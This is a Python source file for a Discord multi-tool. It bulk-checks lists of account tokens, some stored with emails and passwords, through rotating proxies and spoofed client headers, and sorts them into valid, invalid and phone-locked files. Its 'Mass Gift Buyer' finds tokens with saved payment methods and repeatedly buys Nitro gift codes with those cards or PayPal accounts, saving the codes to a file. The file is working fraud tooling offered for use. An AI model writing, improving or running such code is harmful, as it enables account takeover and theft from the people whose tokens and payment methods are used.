import os
import logging
import asyncio
import aiohttp
from aiohttp import client_exceptions
import tasksio
import time
import random

# TODO: Refactor this entire fucking thing, it's bad code, but I'm writing this at 3:08 AM and I can't be bothered to do that.

magenta = "\x1b[35;1m"
blue = "\x1b[34;1m"
yellow = "\x1b[33;1m"
red = "\x1b[31;1m"
green = "\x1b[32;1m"
reset = "\x1b[0m"

logging.basicConfig(
	level=logging.INFO,
	format=f"{magenta}[{reset}%(asctime)s{magenta}]{reset} %(message)s{reset}",
	datefmt="%H:%M:%S"
)


def get_proxy(enabled: bool, proxy_path: str):
	if not enabled:
		return None
	else:
		proxies = open(proxy_path, "r").readlines()
		return f"http://{random.choice(proxies)}"


def headers(header_token: str):
	return {"Authorization": header_token, "accept": "*/*", "accept-language": "en-US", "connection": "keep-alive",
			"cookie": f"__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US", "DNT": "1",
			"origin": "https://discord.com", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", "referer": "https://discord.com/channels/@me", "TE": "Trailers",
			"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9007 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36",
			"X-Context-Properties": "e30=",
			"X-Debug-Options": "bugReporterEnabled",
			"X-Discord-Locale": "en-GB",
			"X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJlbi1VUyIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwNy4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwNy4wIiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTA3LjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTYzMDM1LCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ=="}


class ProxyFormatter:
	def __init__(self):
		os.system("cls")

		self.proxies = []
		self.formatted = []
		with open("proxy formatter/proxies.txt") as file:
			self.proxies.extend(proxies.strip() for proxies in file)
		self.res = str(time.time())

	async def reformat(self):
		for proxy in self.proxies:
			sproxy = proxy.split(":")
			proxy_ip = sproxy[0]
			proxy_port = sproxy[1]
			proxy_username = sproxy[2]
			proxy_password = sproxy[3]

			new_proxy = f"{proxy_username}:{proxy_password}@{proxy_ip}:{proxy_port}"
			self.formatted.append(new_proxy)

		formatted_proxy_list = ""

		for formatted_proxy in self.formatted:
			formatted_proxy_list += f"{formatted_proxy}\n"

		open("proxy formatter/formatted.txt", "a+").write(formatted_proxy_list)


class TokenChecker:
	def __init__(self):
		os.system("cls")

		self.use_proxies = False
		self.checked = 0
		self.tokens = []
		with open("token checker/tokens.txt") as file:
			self.tokens.extend(token.strip() for token in file)
		self.res = str(time.time())
		try:
			os.mkdir(f"token checker/results")
		except FileExistsError:
			pass
		os.mkdir(f"token checker/results/{self.res}")
		self.validtokens = []
		self.invalidtokens = []
		self.phonelockedtokens = []
		self.duplicates = []

	async def check(self, ogtoken):
		email = ""
		password = ""
		token = ogtoken
		os.system(f"title {self.checked}/{len(self.tokens)}")

		if "@" in ogtoken:
			stoken = ogtoken.split(":")
			email = stoken[0] + ":"
			password = stoken[1] + ":"
			token = stoken[2]

		ftoken = email + password + token

		try:
			proxy = get_proxy(self.use_proxies, "token checker/proxies.txt")
			async with aiohttp.ClientSession(headers=headers(token)) as client:
				async with client.get("https://discord.com/api/v9/users/@me/settings", proxy=proxy) as response:
					resp = await response.text()
					if "You need to verify your account in order to perform this action" in resp:
						logging.info(f"Phone Locked [{magenta}{token[:22]}...{reset}] - {resp[:30]}")
						self.phonelockedtokens.append(token)
						with open(f"token checker/results/{self.res}/phone locked.txt", "a+") as f:
							f.write(f"{ftoken}\n")
						self.checked += 1
					elif "401: Unauthorized" in resp:
						logging.info(f"Invalid      [{magenta}{token[:22]}...{reset}] - {resp[:30]}")
						self.invalidtokens.append(token)
						with open(f"token checker/results/{self.res}/invalid.txt", "a+") as f:
							f.write(f"{ftoken}\n")
						self.checked += 1
					elif "You are being rate limited." in resp:
						resp2 = await response.json()
						retry_after = resp2.get("retry_after")
						logging.info(f"Ratelimited  [retrying in {magenta}{retry_after}{reset}] - {resp[:30]}")
						time.sleep(float(retry_after + 0.2))
						await self.check(token)
					else:
						logging.info(f"Valid        [{magenta}{token[:22]}...{reset}] - {resp[:30]}")
						self.validtokens.append(token)
						with open(f"token checker/results/{self.res}/valid.txt", "a+") as f:
							f.write(f"{ftoken}\n")
						self.checked += 1
		except client_exceptions.ClientHttpProxyError:
			await self.check(ogtoken)
		except client_exceptions.ServerDisconnectedError:
			await self.check(ogtoken)
		except client_exceptions.ClientProxyConnectionError:
			await self.check(ogtoken)
		except Exception as e:
			print(e)
			await self.check(ogtoken)

	async def check_tokens(self, use_proxies: bool):
		os.system("cls")
		self.use_proxies = use_proxies

		async with tasksio.TaskPool(400) as pool:
			for token in self.tokens:
				await pool.put(self.check(token))

		logging.info(
			f"Checked {magenta}{len(self.validtokens) + len(self.invalidtokens) + len(self.phonelockedtokens)}{reset} tokens, {magenta}{len(self.validtokens)}{reset} valid, {magenta}{len(self.invalidtokens)}{reset} invalid, {magenta}{len(self.phonelockedtokens)}{reset} phone locked")


class GiftBuyer:
	def __init__(self):
		os.system("cls")

		self.use_proxies = False
		self.tokens = []
		with open("gift buyer/tokens.txt") as file:
			self.tokens.extend(token.strip() for token in file)
		self.validtokens = []
		self.invalidtokens = []
		self.phonelockedtokens = []
		self.paymenttokens = []
		self.paymentmethods = 0
		self.type = input(f"{reset}Type ({magenta}Basic{reset}, {magenta}Classic{reset}, {magenta}Boost{reset}): {magenta}").lower()
		self.duration = input(
			f"{reset}Duration{reset} ({magenta}Month{reset}, {magenta}Year{reset}): {magenta}").lower()
		self.continuebuyq = input(
			f"{reset}Try to buy again after success? {reset}({magenta}y{reset}/{magenta}n{reset}): {magenta}")

		self.continuebuy = self.continuebuyq == "y"
		if self.type == "basic":
			self.sku_id = "978380684370378762"

			if self.duration == "month":
				self.sku_sub_id = "978380692553465866"
				self.nitro_price = 299
			elif self.duration == "year":
				self.sku_sub_id = "1024422698568122368"
				self.nitro_price = 2999
			else:
				logging.info(f"{red}Invalid duration{reset}")
				time.sleep(5)
				exit()
		elif self.type == "classic":
			self.sku_id = "521846918637420545"

			if self.duration == "month":
				self.sku_sub_id = "511651871736201216"
				self.nitro_price = 499
			elif self.duration == "year":
				self.sku_sub_id = "511651876987469824"
				self.nitro_price = 4999
			else:
				logging.info(f"{red}Invalid duration{reset}")
				time.sleep(5)
				exit()
		elif self.type == "boost":
			self.sku_id = "521847234246082599"

			if self.duration == "month":
				self.sku_sub_id = "511651880837840896"
				self.nitro_price = 999
			elif self.duration == "year":
				self.sku_sub_id = "511651885459963904"
				self.nitro_price = 9999
			else:
				logging.info(f"{red}Invalid duration{reset}")
				time.sleep(5)
				exit()
		else:
			logging.info(f"{red}Invalid type{reset}")
			time.sleep(5)
			exit()

	async def check(self, token):
		try:
			# TODO: Maybe proxy this? or just move over to checking tokens while getting payment methods, would be like 2x more efficient.
			async with aiohttp.ClientSession(headers=headers(token)) as client:
				async with client.get("https://discord.com/api/v9/users/@me/settings") as response:
					resp = await response.text()
					if "You need to verify your account in order to perform this action" in resp:
						logging.info(f"Phone Locked [{magenta}{token[:22]}...{reset}] - {resp[:30]}")
						self.phonelockedtokens.append(token)
					elif "401: Unauthorized" in resp:
						logging.info(f"Invalid      [{magenta}{token[:22]}...{reset}] - {resp[:30]}")
						self.invalidtokens.append(token)
					elif "You are being rate limited." in resp:
						resp2 = await response.json()
						retry_after = resp2.get("retry_after")
						logging.info(f"Ratelimited  [retrying in {magenta}{retry_after}{reset}] - {resp[:30]}")
						time.sleep(float(retry_after + 0.2))
						await self.check(token)
					else:
						logging.info(f"Valid        [{magenta}{token[:22]}...{reset}] - {resp[:30]}")
						self.validtokens.append(token)
		except client_exceptions.ClientHttpProxyError:
			await self.check(token)
		except client_exceptions.ServerDisconnectedError:
			await self.check(token)
		except client_exceptions.ClientProxyConnectionError:
			await self.check(token)
		except Exception as e:
			logging.info(
				f"[{yellow}/{reset}] Exception: {magenta}{e}{reset} [{magenta}{token[:22]}...{reset}]")

	async def payment(self, token):
		async with aiohttp.ClientSession(headers=headers(token)) as client:
			async with client.get("https://discord.com/api/v9/users/@me/billing/payment-sources") as response:
				resp = await response.json()
				if resp:
					self.paymenttokens.append(token)
					for _ in resp:
						self.paymentmethods += 1

	async def check_tokens(self, use_proxies: bool):
		os.system("cls")
		self.use_proxies = use_proxies

		async with tasksio.TaskPool(1000) as pool:
			for token in self.tokens:
				await pool.put(self.check(token))

		logging.info(
			f"Checked {magenta}{len(self.validtokens) + len(self.invalidtokens) + len(self.phonelockedtokens)}{reset} tokens, {magenta}{len(self.validtokens)}{reset} valid, {magenta}{len(self.invalidtokens)}{reset} invalid, {magenta}{len(self.phonelockedtokens)}{reset} phone locked")

	async def check_payments(self):
		async with tasksio.TaskPool(75) as pool:
			for token in self.validtokens:
				await pool.put(self.payment(token))

	async def actualbuy(self, token):
		proxy = get_proxy(self.use_proxies, "gift buyer/proxies.txt")
		# TODO: Rewrite this thing as well because this code is worse than my will to live.
		async with aiohttp.ClientSession(headers=headers(token)) as client:
			try:
				async with client.get("https://discord.com/api/v9/users/@me/billing/payment-sources",
										proxy=proxy) as response:
					resp = await response.json()
					if resp:
						for source in resp:
							try:
								try:
									payment_brand = source["brand"]
								except KeyError:
									payment_brand = "paypal"
								source_id = source["id"]
								async with client.post(f"https://discord.com/api/v9/store/skus/{self.sku_id}/purchase",
														json={
															"expected_amount": self.nitro_price,
															"expected_currency": "usd",
															"gateway_checkout_context": None,
															"gift": True,
															"payment_source_id": source_id,
															"payment_source_token": None,
															"purchase_token": "6a0bcba6-403d-49f2-8839-ca76affab73e",
															"sku_subscription_plan_id": self.sku_sub_id
														}) as purchase_response:
									json = await purchase_response.json()
									if json.get("gift_code"):
										logging.info(
											f"[{green}+{reset}] [{magenta}{payment_brand}{reset}] Purchased nitro [{magenta}{token[:22]}...{reset}]")
										with open("gift buyer/nitros.txt", "a+") as f:
											code = json.get("gift_code")
											f.write(f"discord.gift/{code}\n")
										if self.continuebuy:
											await self.actualbuy(token)
									elif json.get("message"):
										message = json.get("message")
										if "overloaded" in message:
											logging.info(
												f"[{blue}={reset}] Currently overloaded, retrying. [{magenta}{token[:22]}...{reset}]")
											await asyncio.sleep(500)
											await self.actualbuy(token)
										if message == "The resource is being rate limited.":
											retry_after = json.get("retry_after")
											logging.info(
												f"[{red}-{reset}] [{magenta}{payment_brand}{reset}] {message} [{magenta}{retry_after}{reset}] [{magenta}{token[:22]}...{reset}]")
										else:
											logging.info(
												f"[{red}-{reset}] [{magenta}{payment_brand}{reset}] {message} [{magenta}{token[:22]}...{reset}]")
									else:
										logging.info(
											f"[{yellow}/{reset}] [{magenta}{payment_brand}{reset}] Failed to buy nitro for some reason. [{magenta}{token[:22]}...{reset}]")
							except client_exceptions.ClientHttpProxyError:
								await self.actualbuy(token)
							except client_exceptions.ServerDisconnectedError:
								await self.actualbuy(token)
							except client_exceptions.ClientProxyConnectionError:
								await self.actualbuy(token)
							except Exception as e:
								logging.info(
									f"[{yellow}/{reset}] Exception: {magenta}{e}{reset} [{magenta}{token[:22]}...{reset}]")
			except client_exceptions.ClientHttpProxyError:
				await self.actualbuy(token)
			except client_exceptions.ServerDisconnectedError:
				await self.actualbuy(token)
			except client_exceptions.ClientProxyConnectionError:
				await self.actualbuy(token)
			except Exception as e:
				logging.info(
					f"[{yellow}/{reset}] Exception: {magenta}{e}{reset} [{magenta}{token[:22]}...{reset}]")

	async def buy(self):
		async with tasksio.TaskPool(30) as pool:
			for token in self.paymenttokens:
				await pool.put(self.actualbuy(token))


class InventoryChecker:
	def __init__(self):
		os.system("cls")

		self.use_proxies = False
		self.tokens = []
		with open("inventory checker/tokens.txt") as file:
			self.tokens.extend(token.strip() for token in file)
		self.validtokens = []
		self.invalidtokens = []
		self.phonelockedtokens = []

	async def check(self, token):
		try:
			async with aiohttp.ClientSession(headers=headers(token)) as client:
				async with client.get("https://discord.com/api/v9/users/@me/settings") as response:
					resp = await response.text()
					if "You need to verify your account in order to perform this action" in resp:
						logging.info(f"Phone Locked [{magenta}{token[:22]}...{reset}] - {resp[:30]}")
						self.phonelockedtokens.append(token)
					elif "401: Unauthorized" in resp:
						logging.info(f"Invalid      [{magenta}{token[:22]}...{reset}] - {resp[:30]}")
						self.invalidtokens.append(token)
					elif "You are being rate limited." in resp:
						resp2 = await response.json()
						retry_after = resp2.get("retry_after")
						logging.info(f"Ratelimited  [retrying in {magenta}{retry_after}{reset}] - {resp[:30]}")
						time.sleep(float(retry_after + 0.2))
						await self.check(token)
					else:
						logging.info(f"Valid        [{magenta}{token[:22]}...{reset}] - {resp[:30]}")
						self.validtokens.append(token)
		except client_exceptions.ClientHttpProxyError:
			await self.check(token)
		except client_exceptions.ServerDisconnectedError:
			await self.check(token)
		except client_exceptions.ClientProxyConnectionError:
			await self.check(token)
		except Exception as e:
			logging.info(
				f"[{yellow}/{reset}] Exception: {magenta}{e}{reset} [{magenta}{token[:22]}...{reset}]")

	async def inventory(self, token):
		try:
			# TODO: actually finish this.
			proxy = get_proxy(self.use_proxies, "inventory checker/proxies.txt")
		except client_exceptions.ClientHttpProxyError:
			await self.inventory(token)
		except client_exceptions.ServerDisconnectedError:
			await self.inventory(token)
		except client_exceptions.ClientProxyConnectionError:
			await self.inventory(token)
		except Exception as e:
			logging.info(
				f"[{yellow}/{reset}] Exception: {magenta}{e}{reset} [{magenta}{token[:22]}...{reset}]")

	async def check_inventories(self):
		async with tasksio.TaskPool(1000) as pool:
			for token in self.validtokens:
				await pool.put(self.inventory(token))

	async def check_tokens(self, use_proxies: bool):
		os.system("cls")
		self.use_proxies = use_proxies

		async with tasksio.TaskPool(1000) as pool:
			for token in self.tokens:
				await pool.put(self.check(token))

		logging.info(
			f"Checked {magenta}{len(self.validtokens) + len(self.invalidtokens) + len(self.phonelockedtokens)}{reset} tokens, {magenta}{len(self.validtokens)}{reset} valid, {magenta}{len(self.invalidtokens)}{reset} invalid, {magenta}{len(self.phonelockedtokens)}{reset} phone locked")


def menu():
	os.system("cls")
	print(f"""
{magenta}1 {reset}-> {magenta}Token Checker
{magenta}2 {reset}-> {magenta}Mass Gift Buyer
{magenta}3 {reset}-> {magenta}Gift Inventory Checker
{magenta}4 {reset}-> {magenta}Proxy Formatter (ip:port:user:pass -> user:pass@ip:port)
{reset}""")

	choice = 0

	try:
		choice = int(input(f"\n\nChoose -> {magenta}"))
	except ValueError:
		menu()

	use_proxies = False

	if choice in [1, 2, 3]:
		use_proxies = input(f"{reset}Use Proxies? ({magenta}y{reset}/{magenta}n{reset}) -> {magenta}")
		if use_proxies.lower() == "y":
			use_proxies = True

	if choice == 1:
		token_checker(use_proxies)
	elif choice == 2:
		buy_gifts(use_proxies)
	elif choice == 3:
		check_inventory(use_proxies)
	elif choice == 4:
		proxy_formatter()
	else:
		menu()


def buy_gifts(use_proxies: bool):
	gb = GiftBuyer()
	logging.info("Checking tokens.")
	asyncio.get_event_loop_policy().get_event_loop().run_until_complete(gb.check_tokens(use_proxies))
	logging.info("Getting payment methods from valid tokens.")
	asyncio.get_event_loop_policy().get_event_loop().run_until_complete(gb.check_payments())
	logging.info(
		f"Got {magenta}{len(gb.paymenttokens)}{reset} tokens with payment methods, with a total of {magenta}{gb.paymentmethods}{reset} total payment methods, buying nitros.")
	logging.info("Buying nitros on tokens with payment methods.")
	asyncio.get_event_loop_policy().get_event_loop().run_until_complete(gb.buy())

	print("\n")
	logging.info("Finished, press any key to return to main menu")
	os.system("pause >NUL")
	menu()


def token_checker(use_proxies: bool):
	tc = TokenChecker()
	asyncio.get_event_loop_policy().get_event_loop().run_until_complete(tc.check_tokens(use_proxies))

	print("\n")
	logging.info("Finished, press any key to return to main menu")
	os.system("pause >NUL")
	menu()


def check_inventory(use_proxies: bool):
	ic = InventoryChecker()
	asyncio.get_event_loop_policy().get_event_loop().run_until_complete(ic.check_tokens(use_proxies))
	print("Checking inventories.")
	asyncio.get_event_loop_policy().get_event_loop().run_until_complete(ic.check_inventories())

	print("\n")
	logging.info("Finished, press any key to return to main menu")
	os.system("pause >NUL")
	menu()


def proxy_formatter():
	pf = ProxyFormatter()
	asyncio.get_event_loop_policy().get_event_loop().run_until_complete(pf.reformat())

	logging.info("Finished, press any key to return to main menu")
	os.system("pause >NUL")
	menu()


menu()
